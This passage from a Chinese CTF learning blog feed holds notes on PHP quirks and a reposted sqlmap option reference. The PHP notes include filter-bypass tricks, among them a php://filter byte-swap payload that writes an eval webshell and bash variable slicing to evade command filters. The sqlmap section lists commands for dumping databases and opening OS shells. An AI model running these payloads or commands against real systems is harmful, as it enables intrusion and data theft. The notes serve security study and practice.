UCS-2BE</p><p>payload:<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php<br>post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<br>这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行</p><h1 id="21、通过内置bash命令构造命令"><a href="#21、通过内置bash命令构造命令" class="headerlink" title="21、通过内置bash命令构造命令"></a>21、通过内置bash命令构造命令</h1><p>在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造nl，可以写为下面这种方式</p><p>${PATH:14:1}${PATH:5:1}</p><p>在linux中可以用~获取变量的最后几位，也可以写为${PATH:~0}${PWD:~0}，字母与0作用一样，${PATH:~A}${PWD:~A}也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待</p><h1 id="22、PHP变量名非法字符"><a href="#22、PHP变量名非法字符" class="headerlink" title="22、PHP变量名非法字符"></a>22、PHP变量名非法字符</h1><p>比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">var_dump($_POST);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></div><p>传值：AA.BB.CC&#x3D;14<br>输出：array(1) { [“AA_BB_CC”]&#x3D;&gt; string(2) “14” }<br>但输入AA[BB.CC它就只替换 [ 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }</p><h1 id="23、gettext拓展的使用"><a href="#23、gettext拓展的使用" class="headerlink" title="23、gettext拓展的使用"></a>23、gettext拓展的使用</h1><p>var_dump(call_user_func($f1,$f2));<br>如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo gettext(&quot;phpinfo&quot;);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line">echo _(&quot;phpinfo&quot;);</span><br><span class="line">结果 phpinfo</span><br></pre></td></tr></table></figure></div><h1 id="24、正则最大回溯次数绕过"><a href="#24、正则最大回溯次数绕过" class="headerlink" title="24、正则最大回溯次数绕过"></a>24、正则最大回溯次数绕过</h1><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><p>也就是说前面100万个字母，后面是语句就好，如下面的例子</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $flag;</span><br></pre></td></tr></table></figure></div><p>前面100万个字母后面ABC就可以echo $flag</p><h1 id="25、调用类中的函数"><a href="#25、调用类中的函数" class="headerlink" title="25、调用类中的函数"></a>25、调用类中的函数</h1><p>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法</p><p>也就是说双冒号不用实例化类就可以调用类中的静态方法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure></div><p>这个传入ctfshow&#x3D;ctfshow::getFlag即可</p><h1 id="26、return绕过"><a href="#26、return绕过" class="headerlink" title="26、return绕过"></a>26、return绕过</h1><p>eval(“return 1;phpinfo();”);会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。</p><p>来源: Tajang的大千世界<br>文章作者: Tajang<br>文章链接: <a class="link"   href="https://ctfking.com/2021/07/14/php-te-xing-zong-jie/" >https://ctfking.com/2021/07/14/php-te-xing-zong-jie/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php特性" scheme="http://example.com/categories/php%E7%89%B9%E6%80%A7/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2025-03-04T12:50:02.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载自<a class="link"   href="https://www.cnblogs.com/R3col/p/12452543.html" >https://www.cnblogs.com/R3col/p/12452543.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap支持五种不同的注入模式：<br>基于布尔的盲注<br>基于时间的盲注<br>基于报错注入<br>联合查询注入<br>堆叠注入<br>sqlmap支持九种不同的数据库：<br>​ MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><p>自动检测</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -batch</span><br></pre></td></tr></table></figure></div><p>指定参数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx/?id=x&amp;param=x -p id</span><br></pre></td></tr></table></figure></div><p>指定数据库类型</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx –dbms mysql</span><br></pre></td></tr></table></figure></div><p>从文件读取http请求报文</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -batch</span><br></pre></td></tr></table></figure></div><p>设置cookie</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --cookie=&quot;JSESSION=asd&quot;</span><br></pre></td></tr></table></figure></div><p>查询数据库</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --dbs</span><br></pre></td></tr></table></figure></div><p>查询表</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 --tables</span><br></pre></td></tr></table></figure></div><p>查字段名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure></div><p>爆数据</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 -C &quot;字段名1，字段名2&quot;--dump</span><br></pre></td></tr></table></figure></div><p>在数据库中搜索字段 &#x2F; 表 &#x2F; 数据库名</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password</span><br></pre></td></tr></table></figure></div><p>写入文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx -–file-dest &quot;要写入的文件在本地的路径&quot; –file-write &quot;目标路径&quot;</span><br></pre></td></tr></table></figure></div><p>调用shell</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.xxx --os-shell</span><br></pre></td></tr></table></figure></div><p>-tip: 是否跟随302跳转<br>​ 当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br>​ 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br>​ 目的是要追踪到错误信息。</p><h2 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h2><p>用法<br>python sqlmap.py [选项]</p><p>选项</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help            显示基本帮助信息并退出</span><br><span class="line">-hh                   显示高级帮助信息并退出</span><br><span class="line">--version             显示程序版本信息并退出</span><br><span class="line">-v VERBOSE            输出信息详细程度级别：0-6（默认为 1）</span><br></pre></td></tr></table></figure></div><p>目标<br>​ 至少提供一个以下选项以指定目标</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d DIRECT           直接连接数据库</span><br><span class="line">-u URL, --url=URL   目标 URL（例如：&quot;http://www.site.com/vuln.php?id=1&quot;）</span><br><span class="line">-l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址</span><br><span class="line">-m BULKFILE         从文本文件中获取批量目标</span><br><span class="line">-r REQUESTFILE      从文件中读取 HTTP 请求</span><br><span class="line">-g GOOGLEDORK       使用 Google dork 结果作为目标</span><br><span class="line">-c CONFIGFILE       从 INI 配置文件中加载选项</span><br></pre></td></tr></table></figure></div><p>请求<br>​ 以下选项可以指定连接目标地址的方式</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）</span><br><span class="line">--data=DATA         使用 POST 发送数据串（例如：&quot;id=1&quot;）</span><br><span class="line">--param-del=PARA..  设置参数值分隔符（例如：&amp;）</span><br><span class="line">--cookie=COOKIE     指定 HTTP Cookie（例如：&quot;PHPSESSID=a8d127e..&quot;）</span><br><span class="line">--cookie-del=COO..  设置 cookie 分隔符（例如：;）</span><br><span class="line">--load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件</span><br><span class="line">--drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数</span><br><span class="line">--user-agent=AGENT  指定 HTTP User-Agent</span><br><span class="line">--random-agent      使用随机的 HTTP User-Agent</span><br><span class="line">--host=HOST         指定 HTTP Host</span><br><span class="line">--referer=REFERER   指定 HTTP Referer</span><br><span class="line">-H HEADER, --hea..  设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span><br><span class="line">--headers=HEADERS   设置额外的 HTTP 头参数（例如：&quot;Accept-Language: fr\nETag: 123&quot;）</span><br><span class="line">--auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）</span><br><span class="line">--auth-cred=AUTH..  HTTP 认证凭证（username:password）</span><br><span class="line">--auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件</span><br><span class="line">--ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）</span><br><span class="line">--ignore-proxy      忽略系统默认代理设置</span><br><span class="line">--ignore-redirects  忽略重定向尝试</span><br><span class="line">--ignore-timeouts   忽略连接超时</span><br><span class="line">--proxy=PROXY       使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO..  使用代理进行认证（username:password）</span><br><span class="line">--proxy-file=PRO..  从文件中加载代理列表</span><br><span class="line">--tor               使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT  设置 Tor 代理端口代替默认端口</span><br><span class="line">--tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））</span><br><span class="line">--check-tor         检查是否正确使用了 Tor</span><br><span class="line">--delay=DELAY       设置每个 HTTP 请求的延迟秒数</span><br><span class="line">--timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）</span><br><span class="line">--retries=RETRIES   连接超时时重试次数（默认为 3）</span><br><span class="line">--randomize=RPARAM  随机更改给定的参数值</span><br><span class="line">--safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：</span><br><span class="line">                    有些网站在你连续多次访问错误地址时会关闭会话连接，</span><br><span class="line">                    后面的“请求”小节有详细说明）</span><br><span class="line">--safe-post=SAFE..  使用 POST 方法发送合法的数据</span><br><span class="line">--safe-req=SAFER..  从文件中加载合法的 HTTP 请求</span><br><span class="line">--safe-freq=SAFE..  每访问两次给定的合法 URL 才发送一次测试请求</span><br><span class="line">--skip-urlencode    不对 payload 数据进行 URL 编码</span><br><span class="line">--csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token</span><br><span class="line">--csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL</span><br><span class="line">--force-ssl         强制使用 SSL/HTTPS</span><br><span class="line">--hpp               使用 HTTP 参数污染攻击</span><br><span class="line">--eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：</span><br><span class="line">                    &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure></div><p>优化<br>​ 以下选项用于优化 sqlmap 性能</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o                  开启所有优化开关</span><br><span class="line">--predict-output    预测常用请求的输出</span><br><span class="line">--keep-alive        使用持久的 HTTP(S) 连接</span><br><span class="line">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br><span class="line">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br></pre></td></tr></table></figure></div><p>注入<br>​ 以下选项用于指定要测试的参数，<br>​ 提供自定义注入 payloads 和篡改参数的脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER    指定需要测试的参数</span><br><span class="line">--skip=SKIP         指定要跳过的参数</span><br><span class="line">--skip-static       指定跳过非动态参数</span><br><span class="line">--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）</span><br><span class="line">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br><span class="line">                    数据库管理系统）类型（例如：MySQL）</span><br><span class="line">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br><span class="line">--os=OS             指定后端 DBMS 的操作系统类型</span><br><span class="line">--invalid-bignum    将无效值设置为大数</span><br><span class="line">--invalid-logical   对无效值使用逻辑运算</span><br><span class="line">--invalid-string    对无效值使用随机字符串</span><br><span class="line">--no-cast           关闭 payload 构造机制</span><br><span class="line">--no-escape         关闭字符串转义机制</span><br><span class="line">--prefix=PREFIX     注入 payload 的前缀字符串</span><br><span class="line">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br><span class="line">--tamper=TAMPER     用给定脚本修改注入数据</span><br></pre></td></tr></table></figure></div><p>检测<br>​ 以下选项用于自定义检测方式</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=LEVEL       设置测试等级（1-5，默认为 1）</span><br><span class="line">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br><span class="line">--string=STRING     用于确定查询结果为真时的字符串</span><br><span class="line">--not-string=NOT..  用于确定查询结果为假时的字符串</span><br><span class="line">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br><span class="line">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br><span class="line">--text-only         只根据页面文本内容对比页面</span><br><span class="line">--titles            只根据页面标题对比页面</span><br></pre></td></tr></table></figure></div><p>技术<br>​ 以下选项用于调整特定 SQL 注入技术的测试方法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=TECH    使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br><span class="line">                    B: Boolean-based blind SQL injection（布尔型盲注）</span><br><span class="line">                    E: Error-based SQL injection（报错型注入）</span><br><span class="line">                    U: UNION query SQL injection（联合查询注入）</span><br><span class="line">                    S: Stacked queries SQL injection（堆叠查询注入）</span><br><span class="line">                    T: Time-based blind SQL injection（时间型盲注）</span><br><span class="line">                    Q: inline Query injection（内联查询注入）</span><br><span class="line">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br><span class="line">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br><span class="line">--union-char=UCHAR  用于暴力猜解列数的字符</span><br><span class="line">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br><span class="line">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br><span class="line">                    推荐阅读《在SQL注入中使用DNS获取数据》</span><br><span class="line">                    http://cb.drops.wiki/drops/tips-5283.html，</span><br><span class="line">                    在后面的“技术”小节中也有相应解释）</span><br><span class="line">--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br><span class="line">                    该选项用于 SQL 二阶注入）</span><br><span class="line">--second-req=SEC..  从文件读取 HTTP 二阶请求</span><br></pre></td></tr></table></figure></div><p>指纹识别</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint   执行广泛的 DBMS 版本指纹识别</span><br></pre></td></tr></table></figure></div><p>枚举<br>​ 以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据。<br>​ 此外，还可以运行你输入的 SQL 语句</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all           获取所有信息、数据</span><br><span class="line">-b, --banner        获取 DBMS banner</span><br><span class="line">--current-user      获取 DBMS 当前用户</span><br><span class="line">--current-db        获取 DBMS 当前数据库</span><br><span class="line">--hostname          获取 DBMS 服务器的主机名</span><br><span class="line">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br><span class="line">--users             枚举出 DBMS 所有用户</span><br><span class="line">--passwords         枚举出 DBMS 所有用户的密码哈希</span><br><span class="line">--privileges        枚举出 DBMS 所有用户特权级</span><br><span class="line">--roles             枚举出 DBMS 所有用户角色</span><br><span class="line">--dbs               枚举出 DBMS 所有数据库</span><br><span class="line">--tables            枚举出 DBMS 数据库中的所有表</span><br><span class="line">--columns           枚举出 DBMS 表中的所有列</span><br><span class="line">--schema            枚举出 DBMS 所有模式</span><br><span class="line">--count             获取数据表数目</span><br><span class="line">--dump              导出 DBMS 数据库表项</span><br><span class="line">--dump-all          导出所有 DBMS 数据库表项</span><br><span class="line">--search            搜索列，表和/或数据库名</span><br><span class="line">--comments          枚举数据时检查 DBMS 注释</span><br><span class="line">-D DB               指定要枚举的 DBMS 数据库</span><br><span class="line">-T TBL              指定要枚举的 DBMS 数据表</span><br><span class="line">-C COL              指定要枚举的 DBMS 数据列</span><br><span class="line">-X EXCLUDE          指定不枚举的 DBMS 标识符</span><br><span class="line">-U USER             指定枚举的 DBMS 用户</span><br><span class="line">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br><span class="line">--pivot-column=P..  指定主列</span><br><span class="line">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br><span class="line">--start=LIMITSTART  指定要导出的数据表条目开始行数</span><br><span class="line">--stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br><span class="line">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">--sql-query=QUERY   指定要执行的 SQL 语句</span><br><span class="line">--sql-shell         调出交互式 SQL shell</span><br><span class="line">--sql-file=SQLFILE  执行文件中的 SQL 语句</span><br></pre></td></tr></table></figure></div><p>暴力破解<br>​ 以下选项用于暴力破解测试</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--common-tables     检测常见的表名是否存在</span><br><span class="line">--common-columns    检测常用的列名是否存在</span><br></pre></td></tr></table></figure></div><p>用户自定义函数注入<br>​ 以下选项用于创建用户自定义函数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--udf-inject        注入用户自定义函数</span><br><span class="line">--shared-lib=SHLIB  共享库的本地路径</span><br></pre></td></tr></table></figure></div><p>访问文件系统<br>​ 以下选项用于访问后端 DBMS 的底层文件系统</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br><span class="line">--file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br><span class="line">--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br></pre></td></tr></table></figure></div><p>访问操作系统<br>​ 以下选项用于访问后端 DBMS 的底层操作系统</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">--os-shell          调出交互式操作系统 shell</span><br><span class="line">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">--priv-esc          数据库进程用户提权</span><br><span class="line">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure></div><p>访问 Windows 注册表：<br>​ 以下选项用于访问后端 DBMS 的 Windows 注册表</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--reg-read          读取一个 Windows 注册表键值</span><br><span class="line">--reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">--reg-del           删除一个 Windows 注册表键值</span><br><span class="line">--reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">--reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">--reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br></pre></td></tr></table></figure></div><p>通用选项：<br>​ 以下选项用于设置通用的参数</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">-t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">--batch             从不询问用户输入，使用默认配置</span><br><span class="line">--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）</span><br><span class="line">--check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）</span><br><span class="line">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）</span><br><span class="line">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">--eta               显示每个结果输出的预计到达时间</span><br><span class="line">--flush-session     清空当前目标的会话文件</span><br><span class="line">--forms             解析并测试目标 URL 的表单</span><br><span class="line">--fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">--hex               获取数据时使用 hex 转换</span><br><span class="line">--output-dir=OUT..  自定义输出目录路径</span><br><span class="line">--parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">--preprocess=PRE..  使用给定脚本预处理响应数据</span><br><span class="line">--repair            重新导出具有未知字符的数据（?）</span><br><span class="line">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">--scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">--update            更新 sqlmap</span><br></pre></td></tr></table></figure></div><p>杂项</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">--answers=ANSWERS   设置预定义回答（例如：“quit=N,follow=N”）</span><br><span class="line">--beep              出现问题提醒或在发现 SQL 注入时发出提示音</span><br><span class="line">--cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span><br><span class="line">--dependencies      检查 sqlmap 缺少（可选）的依赖</span><br><span class="line">--disable-coloring  关闭彩色控制台输出</span><br><span class="line">--gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf      针对 WAF/IPS 防护进行彻底的测试</span><br><span class="line">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">--offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">--purge             安全删除 sqlmap data 目录所有内容</span><br><span class="line">--skip-waf          跳过启发式检测 WAF/IPS 防护</span><br><span class="line">--smart             只有在使用启发式检测时才进行彻底的测试</span><br><span class="line">--sqlmap-shell      调出交互式 sqlmap shell</span><br><span class="line">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）</span><br><span class="line">--wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>linux命令</title>
    <link href="http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/</id>
    <published>2025-02-16T22:49:37.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>cd : 切换目录<br>cd :切换路径<br>cd ~ 切换到当前用户的家目录<br>cd . 切换到当前路径<br>cd .. 切换到上一级路径<br>cd ..&#x2F;.. 切换到上上级路径(其中：在linux中路径分隔符为斜杠&#x2F;)<br>cd - 切换到上一次的路径</p><hr><p>ls : 列出目录内容<br>ls:列出目录内容<br>ls -l:列出详细信息<br>ls -a:列出全部文件信息，包括隐藏文件<br>ls -d:列出目录详细信息<br>ls -h:列出文件信息并显示文件大小单位</p><hr><p>alias&#x2F;unalias  : 命令别名&#x2F;取消命令别名<br>alias 别名&#x3D;’命令’ :给命令起别名<br>unalias 别名 :取消命令别名<br>unalias -a 别名 :取消所有别名 </p><hr><p>mv : 移动、重命名文件<br>mv 旧文件名 新文件名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改文件名<br>如：mv file1 filea将当前目录的文件file1改名为filea<br>mv 旧目录名 新目录名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改目录名<br>如：mv dir1 dira将当前目录下的目录dir1改为dira<br>​mv 文件名  目录名  &#x3D;&#x3D;&#x3D;&#x3D;&gt;移动路径<br>如：mv filea 